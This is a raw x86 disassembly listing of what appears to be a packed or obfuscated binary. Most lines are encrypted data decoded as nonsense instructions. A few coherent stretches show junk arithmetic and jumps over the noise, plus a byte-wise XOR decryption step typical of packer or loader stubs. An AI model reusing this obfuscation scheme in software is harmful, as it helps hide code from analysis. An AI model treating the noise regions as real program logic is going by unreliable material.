  4082d1:	or     BYTE PTR ds:0xff5b16a1,dl
  4082d7:	inc    eax
  4082d8:	push   esp
  4082d9:	rcl    DWORD PTR [esi+0x2bcda76b],cl
  4082df:	iret   
  4082e0:	jbe    0x408320
  4082e2:	not    DWORD PTR [eax]
  4082e4:	in     eax,dx
  4082e5:	ret    
  4082e6:	jp     0x40834b
  4082e8:	ror    ebx,1
  4082ea:	and    al,0xf1
  4082ec:	sub    ch,BYTE PTR [edx]
  4082ee:	rol    DWORD PTR gs:[edx+0x32],cl
  4082f2:	jl     0x4082e5
  4082f4:	imul   esp,edx,0xffffffa6
  4082f7:	jge    0x408305
  4082f9:	xchg   BYTE PTR [esi],al
  4082fb:	or     al,0x51
  4082fd:	adc    eax,0x6b1443d7
  408302:	jbe    0x4082e5
  408304:	js     0x4082e9
  408306:	nop
  408307:	daa    
  408308:	jae    0x408302
  40830a:	sbb    BYTE PTR [ecx],0x68
  40830d:	dec    edi
  40830e:	push   cs
  40830f:	pushf  
  408310:	or     BYTE PTR [edx-0x352dfedf],cl
  408316:	xor    eax,DWORD PTR [eax]
  408318:	jmp    0x408307
  40831a:	sbb    cl,BYTE PTR [esi]
  40831c:	(bad)  
  40831d:	xor    bh,BYTE PTR [edi]
  40831f:	jp     0x40832a
  408321:	or     eax,0xfd44d8b
  408326:	lods   al,BYTE PTR ds:[esi]
  408327:	enter  0x8302,0x3d
  40832b:	inc    esi
  40832c:	sub    DWORD PTR [edx+0x0],eax
  40832f:	add    BYTE PTR [edi],cl
  408331:	mov    bh,0x15
  408333:	repnz sub BYTE PTR [edx+0x0],al
  408337:	mov    DWORD PTR ds:0x42291a,0x73f0
  408341:	mov    DWORD PTR ds:0x4228a6,0x5bc0
  40834b:	mov    DWORD PTR ds:0x4228a6,edi
  408351:	jmp    0x4083c2
  408356:	mov    DWORD PTR ds:0x422966,0x16dc
  408360:	ja     0x40839a
  408366:	push   0x7c34
  40836b:	push   0x2548
  408370:	push   0x422922
  408375:	push   0x4229d2
  40837a:	call   DWORD PTR ds:0x42a04c
  408380:	adc    DWORD PTR ds:0x4229b2,ebx
  408386:	or     DWORD PTR ds:0x422956,0x2706
  408390:	mov    DWORD PTR ds:0x42293e,0x85d
  40839a:	and    edx,DWORD PTR ds:0x4228ee
  4083a0:	mov    DWORD PTR ds:0x422892,0x217b
  4083aa:	mov    edx,DWORD PTR ds:0x422ae2
  4083b0:	mov    edx,DWORD PTR [edx]
  4083b2:	sub    DWORD PTR ds:0x422956,edx
  4083b8:	add    DWORD PTR ds:0x4228b6,0x6a28
  4083c2:	shr    ecx,0x2
  4083c5:	or     DWORD PTR ds:0x4229c2,0x19bb
  4083cf:	mov    ecx,DWORD PTR [ebp-0x30]
  4083d2:	mov    edx,DWORD PTR [ebp-0x2c]
  4083d5:	xor    eax,edi
  4083d7:	shl    ecx,0x1e
  4083da:	and    ecx,0x262b
  4083e0:	xor    edx,edx
  4083e2:	or     eax,edx
  4083e4:	lea    eax,[ebp+eax*1-0x4]
  4083e8:	sbb    edx,ecx
  4083ea:	mov    DWORD PTR [ebp-0x34],eax
  4083ed:	mov    eax,DWORD PTR [ebp-0x30]
  4083f0:	mov    ecx,DWORD PTR [ebp-0x2c]
  4083f3:	and    DWORD PTR ds:0x4228b2,ebx
  4083f9:	shrd   eax,ecx,0x2
  4083fd:	mov    edx,DWORD PTR ds:0x42292e
  408403:	sub    DWORD PTR ds:0x4228fa,edx
  408409:	shr    ecx,0x2
  40840c:	or     ecx,ecx
  40840e:	jmp    0x408998
  408413:	xchg   edi,eax
  408414:	xchg   dl,bl
  408416:	(bad)  
  408418:	pop    ecx
  408419:	test   BYTE PTR [eax+0x3e],bl
  40841c:	mov    esi,0x891aa8d4
  408421:	fsubr  DWORD PTR [eax+0x16164d4b]
  408427:	cmp    eax,0x29161604
  40842c:	or     eax,0x477015e0
  408431:	into   
  408432:	mov    BYTE PTR [eax-0x4e],0xed
  408436:	das    
  408437:	mov    DWORD PTR [ecx+ebp*8-0x32],edi
  40843b:	inc    ebx
  40843c:	sub    eax,0x14f54ba3
  408441:	push   edx
  408442:	int3   
  408443:	ins    BYTE PTR es:[edi],dx
  408444:	into   
  408445:	dec    esi
  408446:	cli    
  408447:	js     0x408423
  408449:	int    0x95
  40844b:	mov    cl,0x3d
  40844d:	or     eax,edi
  40844f:	aam    0xa8
  408451:	jae    0x408458
  408453:	aaa    
  408454:	sub    ebx,DWORD PTR [edi]
  408456:	mov    edx,0x2ffe09aa
  40845b:	clc    
  40845c:	cli    
  40845d:	fild   QWORD PTR [edi]
  40845f:	mov    al,ds:0xd3dcf80e
  408464:	outs   dx,BYTE PTR ds:[esi]
  408465:	in     eax,dx
  408466:	mov    al,0x3e
  408468:	popa   
  408469:	jmp    0x73c5:0x4f4d6318
  408470:	clc    
  408471:	fmul   QWORD PTR [eax]
  408473:	and    esp,edx
  408475:	pop    ebp
  408476:	xchg   BYTE PTR [ebx+0xe232680],bl
  40847c:	ret    
  40847d:	data16 rcr BYTE PTR ds:0x5f00ba4f,cl
  408484:	xor    DWORD PTR [edi+0x70],esp
  408487:	mov    ds:0xbe5250dc,eax
  40848c:	data16 cli 
  40848e:	outs   dx,BYTE PTR ds:[esi]
  40848f:	pop    esi
  408490:	call   DWORD PTR [eax-0x54]
  408493:	adc    al,0x64
  408495:	jne    0x4084af
  408497:	mov    esp,0xe9a5b7ae
  40849c:	pusha  
  40849d:	jge    0x4084f4
  40849f:	dec    ebx
  4084a0:	out    0xb6,eax
  4084a2:	inc    eax
  4084a3:	adc    eax,0xdb451fe0
  4084a8:	popf   
  4084a9:	std    
  4084aa:	pop    esi
  4084ab:	ss push es
  4084ad:	and    al,0xcc
  4084af:	mov    gs,WORD PTR [edi+0x2b]
  4084b2:	sub    eax,0xaf8b370
  4084b7:	fisubr DWORD PTR [esi+0x736b349a]
  4084bd:	sbb    eax,0x44c8296c
  4084c2:	int    0x97
  4084c4:	fcom   QWORD PTR [edi+0x3a71cade]
  4084ca:	ret    
  4084cb:	fild   WORD PTR [eax+0x5]
  4084ce:	jne    0x40852b
  4084d0:	imul   esi,DWORD PTR [ebp-0x25],0x61b4f99b
  4084d7:	jo     0x4084f3
  4084d9:	loope  0x4084cd
  4084db:	push   esp
  4084dc:	mov    ds:0xcb40bbe8,eax
  4084e1:	cmp    al,BYTE PTR [eax]
  4084e3:	or     BYTE PTR [edi+0x31],ah
  4084e6:	rcr    DWORD PTR [edx+0x47011fc6],cl
  4084ec:	mov    ds:0x8e3c13a3,eax
  4084f1:	push   0x7925e048
  4084f6:	sbb    al,0xa9
  4084f8:	mov    bh,0x36
  4084fa:	jmp    0x578b:0xb439936b
  408501:	rcr    BYTE PTR [ecx-0x1b],1
  408504:	hlt    
  408505:	and    DWORD PTR [esi-0x6e],ebp
  408508:	jo     0x4084ee
  40850a:	dec    edx
  40850b:	pop    esi
  40850c:	imul   ebx,esp,0x9332ca34
  408512:	lods   eax,DWORD PTR ds:[esi]
  408513:	mov    ecx,0xf1f81f09
  408518:	add    ebx,DWORD PTR [ecx+0x34]
  40851b:	push   edx
  40851c:	adc    eax,0xb5c4353e
  408521:	ret    0x629e
  408524:	mov    edx,0x559c7afd
  408529:	push   ebx
  40852a:	adc    BYTE PTR [ebp+0x3d675945],ah
  408530:	mov    ebp,0x4b2b0fc4
  408535:	xchg   esp,eax
  408536:	cmp    eax,0x1b63631a
  40853b:	enter  0xa09e,0x5a
  40853f:	adc    al,0x59
  408541:	lock es mov ebx,0x7beb3ad6
  408548:	pop    eax
  408549:	shl    DWORD PTR fs:[ecx],cl
  40854c:	mov    esp,0x65ba06a6
  408551:	cmp    BYTE PTR [edx],ah
  408553:	xor    ebx,ebx
  408555:	sub    edi,DWORD PTR [edx]
  408557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408558:	ins    DWORD PTR es:[edi],dx
  408559:	mov    esp,DWORD PTR [ecx]
  40855b:	pop    edx
  40855c:	int3   
  40855d:	ror    ch,0xdf
  408560:	(bad)  
  408561:	add    DWORD PTR ds:0x7c78db72,eax
  408567:	xchg   edi,eax
  408568:	pushf  
  408569:	jbe    0x408542
  40856b:	es add eax,0x6d14c876
  408571:	pop    ebx
  408572:	fs int 0xbe
  408575:	ins    DWORD PTR es:[edi],dx
  408576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408577:	dec    ebp
  408578:	add    DWORD PTR [ebx+edx*8],ecx
  40857b:	jle    0x4085c8
  40857d:	pop    ecx
  40857e:	ss pop es
  408580:	lea    edi,[ebp-0x7875cc8c]
  408586:	and    BYTE PTR [ebp-0x303fd861],bh
  40858c:	aad    0xa4
  40858e:	pop    ecx
  40858f:	pusha  
  408590:	and    al,0xa4
  408592:	in     al,0xc
  408594:	and    al,BYTE PTR [ebx+0x4c89d141]
  40859a:	out    dx,al
  40859b:	aaa    
  40859c:	pop    ebp
  40859d:	out    dx,eax
  40859e:	jmp    0x9b76:0xd3110975
  4085a5:	or     DWORD PTR [esi+eiz*2+0x29b8e89],0xa76b78fe
  4085b0:	ins    BYTE PTR es:[edi],dx
  4085b1:	rcl    eax,1
  4085b3:	xchg   DWORD PTR [eax-0x5d1dac48],ecx
  4085b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085ba:	inc    ebp
  4085bb:	fst    st(1)
  4085bd:	jl     0x40855d
  4085bf:	iret   
  4085c0:	aaa    
  4085c1:	adc    BYTE PTR [edx-0x1546c410],al
  4085c7:	dec    esp
  4085c8:	mov    dh,0x3f
  4085ca:	mov    dh,0x38
  4085cc:	pop    esp
  4085cd:	sub    DWORD PTR [edi],esi
  4085cf:	push   eax
  4085d0:	mov    WORD PTR [edi],?
  4085d2:	fwait
  4085d3:	jl     0x4085bb
  4085d5:	dec    ebx
  4085d6:	or     edx,ebx
  4085d8:	mov    dl,0xa7
  4085da:	loop   0x408561
  4085dc:	mov    ebx,0xf2a409e
  4085e1:	inc    esi
  4085e2:	pop    ecx
  4085e3:	bound  eax,QWORD PTR [ecx-0x7a]
  4085e6:	inc    eax
  4085e7:	dec    ecx
  4085e8:	pop    ebx
  4085e9:	std    
  4085ea:	inc    eax
  4085eb:	fs inc ebp
  4085ed:	xlat   BYTE PTR ds:[ebx]
  4085ee:	adc    ch,cl
  4085f0:	cmp    ebp,DWORD PTR [edx+0x144fc122]
  4085f6:	jp     0x4085cb
  4085f8:	cdq    
  4085f9:	dec    edi
  4085fa:	jns    0x4085fc
  4085fc:	mov    bl,0x68
  4085fe:	shr    DWORD PTR [ebx+esi*2],cl
  408601:	add    eax,0xf69500c9
  408606:	loope  0x4085da
  408608:	mov    ch,0x67
  40860a:	cwde   
  40860b:	cwde   
  40860c:	jg     0x40866a
  40860e:	sbb    edi,ebp
  408610:	cwde   
  408611:	adc    eax,0xa3d0f1f4
  408616:	xor    eax,0x14ef5bf9
  40861b:	popa   
  40861c:	ret    0xf616
  40861f:	sar    BYTE PTR [ecx+0x6a],cl
  408622:	jp     0x4085c6
  408624:	std    
  408625:	rol    DWORD PTR [eax],0x82
  408628:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408629:	push   edx
  40862a:	xchg   bh,al
  40862c:	pop    ss
  40862d:	mov    ch,0x89
  40862f:	pop    ebp
  408630:	xor    edi,0xdcda4584
  408636:	cmp    edx,eax
  408638:	mov    ds:0x721f733f,al
  40863d:	(bad)
  408640:	mov    ah,0x58
  408642:	not    BYTE PTR [ebx+0x64a2fef7]
  408648:	fild   QWORD PTR ds:[esi-0x63]
  40864c:	(bad)  
  40864d:	out    dx,eax
  40864e:	xchg   ecx,eax
  40864f:	xchg   esp,eax
  408650:	cld    
  408651:	xchg   edx,eax
  408652:	push   cs
  408653:	push   es
  408654:	sbb    BYTE PTR ds:0xf90cc147,dl
  40865a:	outs   dx,BYTE PTR ds:[esi]
  40865b:	in     al,dx
  40865c:	out    0x1,al
  40865e:	dec    ebx
  40865f:	add    ch,BYTE PTR [esi-0x6a363a31]
  408665:	xchg   ecx,eax
  408666:	dec    ecx
  408667:	and    cl,bl
  408669:	dec    eax
  40866a:	stos   DWORD PTR es:[edi],eax
  40866b:	mov    edx,DWORD PTR [esi+0x76]
  40866e:	scas   al,BYTE PTR es:[edi]
  40866f:	in     eax,dx
  408670:	call   DWORD PTR [ebx-0x5bf69336]
  408676:	retf   0xc3f6
  408679:	mov    esp,0x386466c8
  40867e:	adc    ch,BYTE PTR [edx]
  408680:	aad    0xe5
  408682:	mov    dh,0x5f
  408684:	pop    edx
  408685:	push   ss
  408686:	inc    ecx
  408687:	or     dh,bh
  408689:	ins    DWORD PTR es:[edi],dx
  40868a:	sbb    ebx,DWORD PTR [eax+0x5c]
  40868d:	outs   dx,DWORD PTR ds:[esi]
  40868e:	sbb    BYTE PTR [ecx],al
  408690:	xchg   ebp,eax
  408691:	dec    edx
  408692:	int    0xfa
  408694:	dec    esi
  408695:	sbb    edi,edx
  408697:	xor    esi,ebx
  408699:	ret    0x3bd4
  40869c:	push   0x37
  40869e:	xor    eax,0xaea11bd3
  4086a3:	pop    ss
  4086a4:	shl    DWORD PTR [edi+edx*1],0x5c
  4086a8:	mov    ah,0x2c
  4086aa:	push   ds
  4086ab:	ss inc ebp
  4086ad:	loop   0x408721
  4086af:	adc    ch,BYTE PTR [esi-0x4f6b815]
  4086b5:	test   eax,0xe5b8e092
  4086ba:	retf   0x49e4
  4086bd:	xor    eax,0x922cd8ee
  4086c2:	(bad)  
  4086c3:	mov    eax,0x111ececc
  4086c8:	mov    dl,0x39
  4086ca:	and    al,0x3f
  4086cc:	leave  
  4086cd:	dec    ecx
  4086ce:	fstp   DWORD PTR [ebx+0x5b]
  4086d1:	mov    ebp,0xab1447a8
  4086d6:	mov    edx,0xb529cdec
  4086db:	cmp    dl,bl
  4086dd:	fmul   DWORD PTR [edi]
  4086df:	and    al,0xc5
  4086e1:	icebp  
  4086e2:	pop    ebx
  4086e3:	cmp    eax,0x102018d7
  4086e8:	and    ch,bl
  4086ea:	or     bh,BYTE PTR [esi-0x78ddce26]
  4086f0:	js     0x408714
  4086f2:	push   ss
  4086f3:	cmc    
  4086f4:	xchg   DWORD PTR [ecx-0x10],ebx
  4086f7:	mov    eax,DWORD PTR [ecx+0x7e]
  4086fa:	cmp    DWORD PTR ds:0xdbafd4a3,edi
  408700:	popa   
  408701:	or     DWORD PTR [eax+0x54],ecx
  408704:	mov    dl,0xf8
  408706:	jno    0x408765
  408708:	hlt    
  408709:	or     ecx,esp
  40870b:	mov    DWORD PTR [eax+0x5f],edx
  40870e:	lock inc edx
  408710:	add    ch,BYTE PTR [edi+0x3dc5674d]
  408716:	jae    0x4086c9
  408718:	mov    al,ds:0x5dd250e5
  40871d:	fsub   st,st(2)
  40871f:	mov    ds:0x5764c0fb,al
  408724:	ja     0x40876e
  408726:	jae    0x408748
  408728:	sub    ebp,esp
  40872a:	sbb    bh,BYTE PTR [edx+0xac0e6ec]
  408730:	(bad)  
  408731:	test   eax,0x797a5335
  408736:	xchg   edi,eax
  408737:	fcom   QWORD PTR [ecx-0x680eaf65]
  40873d:	jp     0x4087a5
  40873f:	pop    esp
  408740:	sti    
  408741:	jmp    0x6b09:0x9e8ded88
  408748:	push   DWORD PTR [ecx+eiz*1+0xf5c2964]
  40874f:	and    BYTE PTR [ebx],bl
  408751:	arpl   WORD PTR [ecx],ax
  408753:	push   eax
  408754:	ret    0xf7ce
  408757:	adc    BYTE PTR [edx],bh
  408759:	fldcw  WORD PTR [esi-0x5915185f]
  40875f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408760:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408761:	xchg   ebp,eax
  408762:	push   ebx
  408763:	mov    esp,0x2bc64dc0
  408768:	scas   eax,DWORD PTR es:[edi]
  408769:	or     al,0x9e
  40876b:	aad    0x94
  40876d:	sub    dh,BYTE PTR [ebp-0x58]
  408770:	push   esp
  408771:	adc    BYTE PTR [ebx],cl
  408773:	dec    ecx
  408774:	or     ch,BYTE PTR [ebx-0x2b]
  408777:	hlt    
  408778:	es add al,0x9b
  40877b:	inc    esi
  40877c:	sub    eax,0xfe00cb48
  408781:	scas   eax,DWORD PTR es:[edi]
  408782:	jmp    0xfa5a:0xda5b8e39
  408789:	xchg   ebx,eax
  40878a:	in     eax,dx
  40878b:	add    bh,ch
  40878d:	mov    edx,0x6bcbdca7
  408792:	inc    edx
  408793:	mov    dh,0x9b
  408795:	test   ebp,esi
  408797:	add    bh,BYTE PTR [edi+0x634756d5]
  40879d:	loop   0x408761
  40879f:	enter  0x8684,0x84
  4087a3:	imul   edx,DWORD PTR [eax],0x1f
  4087a6:	leave  
  4087a7:	push   ebx
  4087a8:	jmp    0xc4c4399b
  4087ad:	mov    BYTE PTR [ecx-0x18],al
  4087b0:	shr    BYTE PTR [ebx],0x6a
  4087b3:	(bad)  
  4087b4:	push   ebp
  4087b5:	enter  0xf8cd,0x50
  4087b9:	sti    
  4087ba:	jae    0x4087fa
  4087bc:	aas    
  4087bd:	sub    BYTE PTR ss:[esi],0xe0
  4087c1:	and    al,0x28
  4087c3:	fisubr WORD PTR [edx]
  4087c5:	jmp    0xd4d8:0xa6489244
  4087cc:	inc    esp
  4087cd:	in     eax,0x50
  4087cf:	into   
  4087d0:	jns    0x4087ca
  4087d2:	jbe    0x408797
  4087d4:	pop    DWORD PTR [ebx+0x66]
  4087d7:	lock (bad) 
  4087d9:	push   eax
  4087da:	jae    0x4087d9
  4087dc:	pop    ss
  4087dd:	icebp  
  4087de:	cli    
  4087df:	pop    ebx
  4087e0:	jecxz  0x4087a8
  4087e2:	bound  eax,QWORD PTR [esi+edi*1-0x29]
  4087e6:	ds sti 
  4087e8:	addr16 adc eax,0x5e744504
  4087ee:	push   edx
  4087ef:	sbb    DWORD PTR [esi+0x5c131169],edx
  4087f5:	mov    BYTE PTR [ecx+ebx*1-0x25],cl
  4087f9:	mov    bl,0x22
  4087fb:	pop    esp
  4087fc:	aam    0x5d
  4087fe:	jmp    0x4c5df669
  408803:	std    
  408804:	out    dx,eax
  408805:	push   cs
  408806:	push   ebp
  408807:	das    
  408808:	sbb    BYTE PTR [esi],0x87
  40880b:	sbb    al,al
  40880d:	lea    edx,[esi+edi*1-0x4072b26d]
  408814:	xchg   ecx,eax
  408815:	lods   eax,DWORD PTR ds:[esi]
  408816:	inc    ebp
  408817:	jns    0x408845
  408819:	jb     0x4087ab
  40881b:	out    0xb1,al
  40881d:	mov    cl,0x13
  40881f:	sbb    al,BYTE PTR [edx+0x29]
  408822:	pop    ds
  408823:	in     al,dx
  408824:	cmp    dl,0xfd
  408827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408828:	data16 (bad) 
  40882a:	jmp    0x7b910565
  40882f:	mov    ah,0x25
  408831:	sbb    edx,DWORD PTR [esi+0x1a]
  408834:	cmp    esp,esi
  408836:	stc    
  408837:	sti    
  408838:	dec    esi
  408839:	test   al,0x30
  40883b:	push   DWORD PTR [ecx]
  40883d:	push   cs
  40883e:	jge    0x4088be
  408840:	nop
  408841:	mov    al,ds:0xf332aef4
  408846:	aam    0x28
  408848:	ds pop eax
  40884a:	xor    al,0x34
  40884c:	(bad)  
  40884d:	stc    
  40884e:	and    al,0x59
  408850:	inc    esp
  408851:	cmp    eax,0xe07c7219
  408856:	sub    dx,si
  408859:	call   0x4be12bba
  40885e:	xor    BYTE PTR [ebp-0x4213367d],dl
  408864:	xchg   ebx,eax
  408865:	je     0x408806
  408867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408868:	mov    al,0x5
  40886a:	or     BYTE PTR [edi+0xc76282b],0xa8
  408871:	push   ebp
  408872:	mov    eax,ds:0xdeef2f53
  408877:	fisubr DWORD PTR [esi+0x12e98b0f]
  40887d:	mov    ds:0xb87d06fe,eax
  408882:	inc    edx
  408883:	std    
  408884:	jl     0x408896
  408886:	aas    
  408887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408888:	adc    al,0x6b
  40888a:	fnstsw WORD PTR [ecx+0x59b3e0b8]
  408890:	push   DWORD PTR [esi+0x651d1308]
  408896:	and    BYTE PTR [ecx+ebx*2],ah
  408899:	cwde   
  40889a:	lahf   
  40889b:	dec    edi
  40889c:	mov    ebx,0xbe7b7cbe
  4088a1:	mov    dh,0x87
  4088a3:	inc    edi
  4088a4:	mov    ds:0x35106637,al
  4088a9:	and    DWORD PTR ds:0x78aacf73,esp
  4088af:	into   
  4088b0:	mov    eax,0x2dfc0d12
  4088b5:	push   eax
  4088b6:	(bad)  
  4088b8:	inc    ecx
  4088b9:	dec    DWORD PTR [ebx+0x633bdd84]
  4088bf:	cmp    ebp,DWORD PTR [edi-0x3d]
  4088c2:	bound  ebx,QWORD PTR [esi+0x380f635c]
  4088c8:	lods   al,BYTE PTR ds:[esi]
  4088c9:	and    edi,DWORD PTR [eax+0x6d]
  4088cc:	call   0x4d09:0xf2b875e2
  4088d3:	adc    edi,DWORD PTR [eax+0xede9e4e]
  4088d9:	dec    edi
  4088da:	sub    eax,0xd822b5d5
  4088df:	mov    ebp,0xc59263ee
  4088e4:	stos   BYTE PTR es:[edi],al
  4088e5:	xor    ch,BYTE PTR [edx]
  4088e7:	repnz cmp bl,al
  4088ea:	cmp    eax,0xbe7bfdf9
  4088ef:	jno    0x40888f
  4088f1:	inc    esi
  4088f2:	mov    DWORD PTR [edi+0x4ab8c217],ecx
  4088f8:	or     cl,BYTE PTR [edi]
  4088fa:	(bad)  
  4088fb:	popa   
  4088fc:	pop    ecx
  4088fd:	lods   eax,DWORD PTR ds:[esi]
  4088fe:	das    
  4088ff:	and    al,0xbd
  408901:	out    dx,al
  408902:	jnp    0x40892c
  408904:	sbb    DWORD PTR [edx+edi*4-0x27],esp
  408908:	imul   dl
  40890a:	pop    edx
  40890b:	retf   
  40890c:	mov    eax,0x94ce544f
  408911:	aaa    
  408912:	xlat   BYTE PTR ds:[ebx]
  408913:	mov    ah,BYTE PTR [edi+0x67]
  408916:	mov    cs,WORD PTR [esp+ebp*1+0x58]
  40891a:	cmc    
  40891b:	push   0x73
  40891d:	sar    DWORD PTR [ebx],cl
  40891f:	pop    eax
  408920:	cmp    DWORD PTR [ecx+0x27],0x682fec29
  408927:	adc    BYTE PTR [ebx],bh
  408929:	sar    BYTE PTR [edx],0xda
  40892c:	ins    DWORD PTR es:[edi],dx
  40892d:	cmp    ecx,edx
  40892f:	mov    al,0x68
  408931:	gs stos DWORD PTR es:[edi],eax
  408933:	leave  
  408934:	xor    eax,0xfd7c5187
  408939:	jae    0x408991
  40893b:	add    DWORD PTR [ebp+0x531d00f9],ebp
  408941:	retf   
  408942:	fisttp DWORD PTR [eax]
  408944:	aad    0x53
  408946:	call   0x3355:0xcaf1338e
  40894d:	push   edi
  40894e:	(bad)  
  40894f:	sub    eax,0x480b993f
  408954:	xor    ebp,0xc310b74b
  40895a:	push   ebp
  40895b:	in     eax,dx
  40895c:	xor    ebp,esi
  40895e:	dec    edi
  40895f:	iret   
  408960:	mov    ecx,0x50ccc5eb
  408965:	mov    ebx,0xaa969fe4
  40896a:	push   edi
  40896b:	lock out dx,eax
  40896d:	dec    edx
  40896e:	(bad)  
  40896f:	out    0x90,al
  408971:	xor    eax,0x37e33dc6
  408976:	sub    edx,esp
  408978:	leave  
  408979:	or     dl,BYTE PTR ds:0x52c49193
  40897f:	dec    ebx
  408980:	imul   eax,DWORD PTR [esi+ebx*4+0x5015f5b9],0xe6f6a7ee
  40898b:	bound  edi,QWORD PTR [edi]
  40898d:	mov    esp,0xc64732ff
  408992:	and    DWORD PTR [ebx+0x5e44cce9],ebp
  408998:	mov    ecx,DWORD PTR [ebp-0x30]
  40899b:	mov    edx,DWORD PTR [ebp-0x2c]
  40899e:	adc    DWORD PTR ds:0x42294a,0x1fff
  4089a8:	shl    ecx,0x1e
  4089ab:	mov    ecx,DWORD PTR [ebp-0x14]
  4089ae:	xor    eax,edi
  4089b0:	xor    edx,edx
  4089b2:	sbb    DWORD PTR ds:0x4228c2,0x5606
  4089bc:	or     eax,edx
  4089be:	mov    cl,BYTE PTR [eax+ecx*1]
  4089c1:	mov    eax,DWORD PTR [ebp-0x34]
  4089c4:	or     edx,DWORD PTR ds:0x42290e
  4089ca:	xor    BYTE PTR [eax],cl
  4089cc:	mov    eax,DWORD PTR [ebp-0x20]
  4089cf:	sub    DWORD PTR ds:0x422932,0x6c12
  4089d9:	jmp    0x408f63
  4089de:	in     eax,dx
  4089df:	imul   ebx,eax,0x7d
  4089e2:	pop    eax
  4089e3:	je     0x408a4d
  4089e5:	pop    edx
  4089e6:	mov    ds:0x7672b232,eax
  4089eb:	jnp    0x4089d5
  4089ed:	push   0x16164380
  4089f2:	cmp    eax,0x52161604
  4089f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089f8:	mov    al,ds:0x87ea4614
  4089fd:	mov    dl,0x95
  4089ff:	sbb    al,0x3a
  408a01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a02:	fs dec esp
  408a04:	les    edx,FWORD PTR [ebp+eax*2-0x7e0690bd]
  408a0b:	pop    ebp
  408a0c:	cmp    eax,edx
  408a0e:	fisubr DWORD PTR [ebx+0x3f]
  408a11:	call   FWORD PTR [ecx-0x1c]
  408a14:	inc    ecx
  408a15:	jbe    0x4089cf
  408a17:	ja     0x408a60
  408a19:	push   edi
  408a1a:	sub    BYTE PTR [edi-0x3fbfd362],0x75
  408a21:	adc    dl,BYTE PTR [ecx-0x68]
  408a24:	test   eax,0xe4c08bb2
  408a29:	or     dl,cl
  408a2b:	mov    al,0x2a
  408a2d:	(bad)  
  408a2e:	fild   QWORD PTR [edi+edi*1]
  408a31:	call   DWORD PTR [edi+0x4d8b16a1]
  408a37:	jne    0x408a19
  408a39:	fimul  WORD PTR [edi-0x60]
  408a3c:	jg     0x408a17
  408a3e:	leave  
  408a3f:	call   0xa9c2:0x541c8570
  408a46:	sub    eax,0x26b11378
  408a4b:	adc    eax,0x958f1375
  408a50:	inc    ebx
  408a51:	std    
  408a52:	jmp    0x408a5a
  408a54:	into   
  408a55:	pop    edi
  408a56:	xor    eax,0x616c81ba
  408a5b:	in     eax,dx
  408a5c:	mov    ds:0xc035510c,eax
  408a61:	cmp    al,al
  408a63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a64:	push   0x13a3ce37
  408a69:	inc    ebx
  408a6a:	dec    ecx
  408a6b:	test   al,0xf5
  408a6d:	push   eax
  408a6e:	mov    WORD PTR [eax-0x69],?
  408a71:	(bad)  
  408a72:	out    dx,eax
  408a73:	pop    es
  408a74:	nop
  408a75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a76:	fiadd  WORD PTR [edi+0x4cf19f59]
  408a7c:	mov    dl,BYTE PTR [ebx-0xd8b88c0]
  408a82:	xor    bl,BYTE PTR [ecx+0x3d7e526]
  408a88:	cwde   
  408a89:	and    al,0xd2
  408a8b:	mov    ah,0x4f
  408a8d:	icebp  
  408a8e:	sub    DWORD PTR [ecx-0x1fcc05dc],ebx
  408a94:	xor    eax,0xd872c495
  408a99:	mov    edi,0x5a95fd83
  408a9e:	pushf  
  408a9f:	dec    ecx
  408aa0:	mov    al,ds:0x1d5e662c
  408aa5:	cmp    DWORD PTR [edi],0x579a3bb4
  408aab:	jmp    0x840f29bd
  408ab0:	dec    ebx
  408ab1:	inc    esi
  408ab3:	mov    esp,0x90390d5a
  408ab8:	xor    eax,0x67bd44fe
  408abd:	pop    esp
  408abe:	inc    ebx
  408abf:	into   
  408ac0:	ins    DWORD PTR es:[edi],dx
  408ac1:	dec    edi
  408ac2:	pop    edi
  408ac3:	ror    DWORD PTR [esi-0x65],0x8e
  408ac7:	js     0x408a88
  408ac9:	pop    ecx
  408aca:	shl    BYTE PTR [eax+ebx*1-0xaebaade],1
  408ad1:	sbb    bh,BYTE PTR [esi-0x6ce01b68]
  408ad7:	js     0x408aa8
  408ad9:	loop   0x408a91
  408adb:	pop    edx
  408adc:	(bad)  
  408add:	ins    BYTE PTR es:[edi],dx
  408ade:	push   cs
  408adf:	mov    bh,0x8b
  408ae1:	lds    eax,FWORD PTR [edi+0x23]
  408ae4:	in     eax,dx
  408ae5:	add    al,0x96
  408ae7:	mov    ah,0xf1
  408ae9:	mov    ss,esi
  408aeb:	mov    ecx,0xb26aca9a
  408af0:	and    eax,0x706ce231
  408af5:	mov    ds:0x36f29307,eax
  408afa:	les    eax,FWORD PTR [eax+edx*4+0x36]
  408afe:	mov    edx,0x2c6dc94e
  408b03:	mov    al,0xc
  408b05:	in     al,dx
  408b06:	mov    ds,esp
  408b08:	xor    ecx,esp
  408b0a:	test   BYTE PTR [edi-0x7aedc71b],dh
  408b10:	add    al,0xb2
  408b12:	sbb    BYTE PTR ds:0xd372f550,dh
  408b18:	pop    es
  408b19:	dec    ebx
  408b1a:	shr    BYTE PTR [esi+0x29a1a941],1
  408b20:	xchg   edi,eax
  408b21:	(bad)
  408b24:	or     DWORD PTR [edx-0x70b8e5f5],0x4ae750c
  408b2e:	test   al,0x7c
  408b30:	push   eax
  408b31:	outs   dx,BYTE PTR ds:[esi]
  408b32:	les    ecx,FWORD PTR [ebx]
  408b34:	outs   dx,DWORD PTR ds:[esi]
  408b35:	mov    ah,0x3c
  408b37:	out    dx,eax
  408b38:	mov    eax,0x6c7b255c
  408b3d:	inc    ebx
  408b3e:	rol    BYTE PTR [esi],1
  408b40:	jp     0x408b03
  408b42:	pop    ebx
  408b43:	imul   edi,ebp,0x1bc5faf9
  408b49:	pop    DWORD PTR [esi+eax*4-0x75455fdd]
  408b50:	push   es
